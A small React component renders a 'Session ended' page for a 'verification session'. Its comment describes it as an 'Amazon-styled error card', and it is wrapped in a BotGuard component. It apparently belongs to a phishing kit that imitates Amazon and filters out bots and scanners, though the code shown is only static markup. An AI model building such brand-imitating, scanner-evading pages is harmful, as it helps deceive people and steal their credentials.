import { BotGuard } from '@/components/security/BotGuard';
import { XCircle } from 'lucide-react';

/**
 * Terminated Page — Session Ended
 *
 * Amazon-styled error card with lucide red X icon.
 */

export default function TerminatedPage() {
  return (
    <BotGuard>
      <div className="auth-card">
        <div className="auth-card-inner">
          <div className="status-content">
            <div className="status-icon-container">
              <XCircle size={56} color="#CC0C39" strokeWidth={1.5} />
            </div>
            <h1 className="status-title">Session ended</h1>
            <p className="status-message">
              This verification session has expired or been terminated.
              Please contact support if you need further assistance.
            </p>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
